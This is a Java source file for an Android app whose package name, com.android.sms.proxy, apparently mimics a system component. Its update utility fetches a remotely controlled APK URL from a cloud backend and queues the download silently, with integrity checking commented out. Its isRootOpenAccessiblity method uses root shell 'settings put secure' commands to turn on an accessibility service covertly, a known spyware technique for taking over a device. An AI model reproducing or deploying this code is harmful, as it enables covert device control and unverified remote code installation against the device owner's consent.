package com.android.sms.proxy.service;

import android.content.ActivityNotFoundException;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.text.TextUtils;
import android.util.Log;

import com.android.sms.proxy.entity.ApkUpdate;
import com.android.sms.proxy.entity.AppDownloadInfo;
import com.android.sms.proxy.entity.NativeParams;
import com.avos.avoscloud.AVException;
import com.avos.avoscloud.AVObject;
import com.avos.avoscloud.AVQuery;
import com.flurry.android.FlurryAgent;

import net.luna.common.download.model.AppModel;
import net.luna.common.util.ShellUtils;
import net.youmi.android.libs.common.download.ext.OplayDownloadManager;

import java.util.ArrayList;
import java.util.List;

/**
 * @author zyq 16-3-27
 */
public class ApkUpdateUtil {

	public static final boolean DEBUG = NativeParams.APK_UPDATE_UTIL_DEBUG;
	public static final String TAG = "apkUpdateUtil";
	public volatile static ApkUpdateUtil mInstance;
	private Context mContext;

	public static ApkUpdateUtil getInstance(Context context) {
		if (mInstance == null) {
			synchronized (ApkUpdateUtil.class) {
				if (mInstance == null) {
					mInstance = new ApkUpdateUtil(context);
				}
			}
		}
		return mInstance;
	}

	public ApkUpdateUtil(Context context) {
		mContext = context;
	}

	private ApkUpdate getNewUpdateInfo() throws AVException {
		AVQuery<ApkUpdate> query = AVObject.getQuery(ApkUpdate.class);
		ApkUpdate update = query.getFirst();
		if (DEBUG) {
			Log.d(TAG, "获取第一条更新消息");
		}
		if (!verifyUpdateInfo(update)) {
			update = null;
		}
		return update;
	}

	private boolean verifyUpdateInfo(ApkUpdate apkUpdate) {
		try {
			if (mContext == null) return false;
			if (apkUpdate == null) return false;
			if (apkUpdate != null) {

				final String packageName = apkUpdate.getPackage();
				final String versionName = apkUpdate.getVersion();
				final String apkUrl = apkUpdate.getApkUrl();

				final boolean updateNow = Boolean.valueOf(apkUpdate.getUpdateNow());
				if (!updateNow) return false;
				final String currentPackageName = mContext.getPackageName();
				final String currentVersionName = mContext.getPackageManager().getPackageInfo(currentPackageName, 0)
						.versionName;
				if (DEBUG) {
					Log.d(TAG, "包名：" + packageName + " 版本号：" + Float.valueOf(versionName) + " 下载地址：" + apkUrl + " " +
							"当前包名：" + currentPackageName + " 当前版本：" + Float.valueOf(currentVersionName));
				}
				if (currentPackageName.equals(packageName)) {
					if (Float.valueOf(versionName) > Float.valueOf(currentVersionName)) {
						if (!TextUtils.isEmpty(apkUrl)) {
							return true;
						}
					}
				}
			}
		} catch (Throwable e) {
			return false;
		}
		return false;
	}


	public void updateApk() {
		try {
			final ApkUpdate updateApk = getNewUpdateInfo();
			if (updateApk != null) {
				if (DEBUG) Log.d(TAG, "开始下载最新apk");
				AppModel appModel = new AppModel();
				appModel.setAppName(updateApk.getAppname());
				appModel.setDownloadUrl(updateApk.getApkUrl());

				AppDownloadInfo info = new AppDownloadInfo();
				info.setAppName(updateApk.getAppname());
				info.setOwkUrl(updateApk.getApkUrl());
				info.setAppId(1);
				info.setPackageName(updateApk.getPackage());
				info.setVersionName(updateApk.getVersion());
				//info.setApkMd5(updateApk.getApkMd5());

//				final boolean isDownloadManagerAvailable = isDownloadManagerAvailable();
				OplayDownloadManager.getInstance(mContext).addDownloadTask(info);
//				if (isDownloadManagerAvailable()) {
//					if(DEBUG) Log.d(TAG,"downloadManager 开始下载！！！！");
//					AppDownloadManager.getInstance(mContext).downloadApp(appModel, true);
//				}
//				Map<String, String> map = new HashMap<>();
//				map.put(NativeParams.KEY_DOWNLOAD_URL, updateApk.getApkUrl());
//				map.put(NativeParams.KEY_DOWNLOAD_START, String.valueOf(isDownloadManagerAvailable));
//				FlurryAgent.logEvent(NativeParams.EVENT_ACCEPT_UPDATE_INFO, map);
			}

		} catch (Throwable e) {
			if (DEBUG) {
				Log.d(TAG, e.toString());
			}
			FlurryAgent.onError(TAG, "", e);
		}
	}

	private void tryToEnabledDownloadManager() {
		String packageName = "com.android.providers.downloads";
		try {
			if (DEBUG) {
				Log.d(TAG, "enableDownloadManager!!!!!!!!");
			}
			//Open the specific App Info page:
			Intent intent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
			intent.setData(Uri.parse("package:" + packageName));
			mContext.startActivity(intent);
		} catch (ActivityNotFoundException e) {
			//e.printStackTrace();
			//Open the generic Apps page:
			if (DEBUG) Log.d(TAG, e.toString());
			Intent intent = new Intent(android.provider.Settings.ACTION_MANAGE_APPLICATIONS_SETTINGS);
			mContext.startActivity(intent);
		}
	}

	private boolean isDownloadManagerAvailable() {
		int state = mContext.getPackageManager().getApplicationEnabledSetting("com.android.providers.downloads");
		if (state == PackageManager.COMPONENT_ENABLED_STATE_DISABLED ||
				state == PackageManager.COMPONENT_ENABLED_STATE_DISABLED_USER ||
				state == PackageManager.COMPONENT_ENABLED_STATE_DISABLED_UNTIL_USED) {
			return false;
		}
		return true;
	}


	public static boolean isRootOpenAccessiblity(Context context, String packageName, String accessServiceName) {
		try {
			String line = packageName + "/" + accessServiceName;
			Log.d(TAG, "执行命令:" + line);
			List<String> commands = new ArrayList<String>();
			commands.add("settings put secure accessibility_enabled 1");
			commands.add("settings put secure enabled_accessibility_services " + line);
//			ContentResolver cr = context.getContentResolver();
//			String enableStr = Settings.Secure.getString(cr,Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
//			Log.d(TAG,"what services are enabled? : "+enableStr);
//			Settings.Secure.putInt(cr,Settings.Secure.ACCESSIBILITY_ENABLED,1);
//			Settings.Secure.putString(cr,Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES,line);
//			Settings.Secure.putInt(cr,Settings.Secure.ACCESSIBILITY_ENABLED,1);


			ShellUtils.CommandResult commandResult = ShellUtils.execCommand(commands, true);
			if (commandResult.successMsg != null && (commandResult.successMsg.contains("Success") || (commandResult
					.successMsg.contains("success")))) {
				return true;
			} else {

				Log.d(TAG,"辅助失败原因:"+commandResult.errorMsg);
				boolean isRoot = ShellUtils.checkRootPermission();
				if (isRoot) {
					commandResult = ShellUtils.execCommand(commands, true);
					if (commandResult.successMsg != null && (commandResult.successMsg.contains("Success") ||
							commandResult.successMsg.contains("success"))) {
						return true;
					}
				}
			}
		} catch (Throwable e) {
			if (DEBUG) {
				Log.d(TAG, e.toString());
			}
		}
		return false;
	}


}
